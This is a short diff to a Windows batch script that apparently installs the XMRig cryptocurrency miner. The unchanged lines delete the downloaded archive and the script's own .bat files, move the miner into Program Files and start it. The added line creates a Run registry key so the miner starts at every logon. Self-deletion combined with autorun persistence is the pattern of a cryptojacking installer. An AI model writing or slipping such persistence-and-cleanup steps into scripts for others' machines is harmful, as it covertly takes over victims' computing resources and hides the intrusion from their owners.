@@ -7,4 +7,5 @@ del xmrig-6.16.2-gcc-win64.zip
 del xmrig.bat.bak
 del xmrig.bat
 move xmrig-6.16.2 "C:\Program Files"
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "xmrig" /t REG_SZ /F /D "C:\Program Files\xmrig-6.16.2\xmrig.exe"
 start "C:\Program Files\xmrig-6.16.2\xmrig.exe"
